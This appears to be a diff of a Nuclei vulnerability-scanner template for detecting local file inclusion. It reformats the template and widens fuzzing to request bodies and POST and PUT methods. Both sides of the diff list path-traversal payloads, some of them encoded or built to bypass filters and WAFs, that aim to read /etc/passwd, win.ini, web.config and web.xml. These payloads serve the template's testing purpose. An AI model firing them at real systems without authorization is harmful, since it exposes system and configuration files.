@@ -1,5 +1,4 @@
 id: lfi-keyed
-
 info:
   name: LFI Detection - Keyed
   author: pwnhxl
@@ -8,55 +7,20 @@ info:
     - https://owasp.org/www-community/attacks/Unicode_Encoding
   metadata:
     max-request: 25
-  tags: dast,pathtraversal,lfi,vuln
-
+  tags: dast,lfi,pathtraversal,vuln
 variables:
-  fuzz: "../../../../../../../../../../../../../../../"
-  fuzz_urlx2_encode: "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f"
-  fuzz_hex_unicode: "%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f"
-  fuzz_utf8_unicode: "%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF"
-  fuzz_utf8_unicode_x: "%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF"
-  fuzz_bypass_replace: ".../.../.../.../.../.../.../.../.../.../.../.../.../.../.../"
-  fuzz_bypass_replace_windows: '..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\'
-  fuzz_bypass_waf_regx: "./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../"
-
+  fuzz: ../../../../../../../../../../../../../../../
+  fuzz_bypass_replace: '.../.../.../.../.../.../.../.../.../.../.../.../.../.../.../'
+  fuzz_bypass_replace_windows: ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\
+  fuzz_bypass_waf_regx: ./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../
+  fuzz_hex_unicode: '%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f'
+  fuzz_urlx2_encode: '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f'
+  fuzz_utf8_unicode: '%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF'
+  fuzz_utf8_unicode_x: '%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF'
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
-
-    payloads:
-      pathtraversal:
-        - '{{fuzz}}etc/passwd'
-        - '{{fuzz}}windows/win.ini'
-        - '/etc/passwd%00.jpg'
-        - 'c:/windows/win.ini%00.jpg'
-        - '{{fuzz}}etc/passwd%00.jpg'
-        - '{{fuzz}}windows/win.ini%00.jpg'
-        - '{{fuzz_urlx2_encode}}etc%252fpasswd'
-        - '{{fuzz_urlx2_encode}}windows%252fwin.ini'
-        - '{{fuzz_hex_unicode}}etc%u002fpasswd'
-        - '{{fuzz_hex_unicode}}windows%u002fwin.ini'
-        - '{{fuzz_utf8_unicode}}etc%C0%AFpasswd'
-        - '{{fuzz_utf8_unicode}}windows%C0%AFwin.ini'
-        - '{{fuzz_utf8_unicode_x}}etc%C0AFpasswd'
-        - '{{fuzz_utf8_unicode_x}}windows%C0AFwin.ini'
-        - '{{fuzz_bypass_replace}}etc/passwd'
-        - '{{fuzz_bypass_replace}}windows/win.ini'
-        - '{{fuzz_bypass_replace_windows}}windows\win.ini'
-        - '{{fuzz_bypass_waf_regx}}etc/passwd'
-        - '{{fuzz_bypass_waf_regx}}windows/win.ini'
-        - './web.config'
-        - '../web.config'
-        - '../../web.config'
-        - './WEB-INF/web.xml'
-        - '../WEB-INF/web.xml'
-        - '../../WEB-INF/web.xml'
-
-    fuzzing:
-      - part: query
-        mode: single
+  - fuzzing:
+      - fuzz:
+          - '{{pathtraversal}}'
         keys:
           - cat
           - dir
@@ -88,36 +52,69 @@ http:
           - img
           - image
           - images
-        fuzz:
-          - "{{pathtraversal}}"
-
-      - part: query
         mode: single
+        parts:
+          - query
+          - body
+      - fuzz:
+          - '{{pathtraversal}}'
+        mode: single
+        parts:
+          - query
+          - body
         values:
-          - "^(./|../|/)|(.html|.htm|.xml|.conf|.cfg|.log|.txt|.pdf|.doc|.docx|.xls|.csv|.png|.jpg|.gif)$"
-        fuzz:
-          - "{{pathtraversal}}"
-
-    stop-at-first-match: true
-    matchers-condition: or
+          - ^(./|../|/)|(.html|.htm|.xml|.conf|.cfg|.log|.txt|.pdf|.doc|.docx|.xls|.csv|.png|.jpg|.gif)$
     matchers:
-      - type: regex
-        part: body
+      - part: body
         regex:
           - 'root:.*?:[0-9]*:[0-9]*:'
-
-      - type: word
-        part: body
+        type: regex
+      - part: body
+        type: word
         words:
-          - 'for 16-bit app support'
-
-      - type: regex
-        part: body
+          - for 16-bit app support
+      - part: body
         regex:
-          - '(<web-app[\s\S]+<\/web-app>)'
-
-      - type: regex
-        part: body
+          - (<web-app[\s\S]+<\/web-app>)
+        type: regex
+      - part: body
         regex:
-          - '(<system.webServer[\s\S]+<\/system.webServer>)'
+          - (<system.webServer[\s\S]+<\/system.webServer>)
+        # digest: 4a0a00473045022100b917be210562f0d09609a7c90cff98a2e93db64f5c6efae6e3c934d0cd6f611902205d5ac63faddba6eac5cbf4a36887f1727ea7752005af4ea6332e2c61a0fb4f9f:922c64590222798bb761d5b6d8e72950
 
+        type: regex
+    matchers-condition: or
+    payloads:
+      pathtraversal:
+        - '{{fuzz}}etc/passwd'
+        - '{{fuzz}}windows/win.ini'
+        - /etc/passwd%00.jpg
+        - c:/windows/win.ini%00.jpg
+        - '{{fuzz}}etc/passwd%00.jpg'
+        - '{{fuzz}}windows/win.ini%00.jpg'
+        - '{{fuzz_urlx2_encode}}etc%252fpasswd'
+        - '{{fuzz_urlx2_encode}}windows%252fwin.ini'
+        - '{{fuzz_hex_unicode}}etc%u002fpasswd'
+        - '{{fuzz_hex_unicode}}windows%u002fwin.ini'
+        - '{{fuzz_utf8_unicode}}etc%C0%AFpasswd'
+        - '{{fuzz_utf8_unicode}}windows%C0%AFwin.ini'
+        - '{{fuzz_utf8_unicode_x}}etc%C0AFpasswd'
+        - '{{fuzz_utf8_unicode_x}}windows%C0AFwin.ini'
+        - '{{fuzz_bypass_replace}}etc/passwd'
+        - '{{fuzz_bypass_replace}}windows/win.ini'
+        - '{{fuzz_bypass_replace_windows}}windows\win.ini'
+        - '{{fuzz_bypass_waf_regx}}etc/passwd'
+        - '{{fuzz_bypass_waf_regx}}windows/win.ini'
+        - ./web.config
+        - ../web.config
+        - ../../web.config
+        - ./WEB-INF/web.xml
+        - ../WEB-INF/web.xml
+        - ../../WEB-INF/web.xml
+    pre-condition:
+      - dsl:
+          - method == "GET"
+          - method == "POST"
+          - method == "PUT"
+        type: dsl
+    stop-at-first-match: true
